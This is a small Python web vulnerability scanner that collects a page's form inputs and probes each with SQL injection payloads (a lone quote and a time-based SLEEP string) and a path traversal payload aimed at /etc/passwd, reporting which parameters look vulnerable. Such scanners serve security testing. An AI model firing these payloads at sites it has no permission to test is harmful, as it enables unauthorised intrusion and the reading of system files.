# Enhancement: added SQL error and LFI checks. 
# V3


import requests
from bs4 import BeautifulSoup
import sys
import time

def check_sqli(url, param):
    payload = "'"
    r = requests.get(url, params={param: payload})
    errors = ["SQL syntax", "mysql_fetch", "ORA-", "Unclosed quotation mark"]
    for err in errors:
        if err.lower() in r.text.lower():
            return True
    # Blind time-based check
    start = time.time()
    requests.get(url, params={param: "1' AND SLEEP(5)-- -"})
    if time.time() - start > 4.5:
        return True
    return False

def check_lfi(url, param):
    payload = "../../../../etc/passwd"
    r = requests.get(url, params={param: payload})
    if "root:" in r.text:
        return True
    return False

def get_forms(url): # as before
    soup = BeautifulSoup(requests.get(url).text, 'html.parser')
    return soup.find_all('form')

def scan(url):
    forms = get_forms(url)
    for form in forms:
        inputs = form.find_all('input')
        for inp in inputs:
            name = inp.get('name')
            if not name:
                continue
            if check_sqli(url, name):
                print(f"[!] SQLi in parameter '{name}'")
            if check_lfi(url, name):
                print(f"[!] LFI in parameter '{name}'")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python webscan.py <url>")
        sys.exit(1)
    scan(sys.argv[1])